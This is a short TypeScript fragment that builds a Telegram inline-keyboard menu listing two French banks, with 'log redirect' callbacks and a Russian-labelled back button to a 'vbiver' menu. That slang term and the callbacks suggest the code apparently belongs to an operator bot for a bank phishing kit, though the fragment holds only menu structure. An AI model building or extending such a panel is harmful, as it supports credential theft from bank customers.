export const frBankList = (id: number) => {
  return {
    "reply_markup":{
      "inline_keyboard":[
        [
          {
            "text":"🔹 La Banque Postale",
            "callback_data": `log redirect bank-labanquepostale ${id} false`
          },
          {
            "text":"🔹 CREDIT AGRICOLE ",
            "callback_data": `log redirect bank-credit-agricole ${id} false`
          }
        ],
        [
          {
            "text":"Назад",
            "callback_data": `log vbiver menu ${id}`
          }
        ]
      ]
    }
  }
}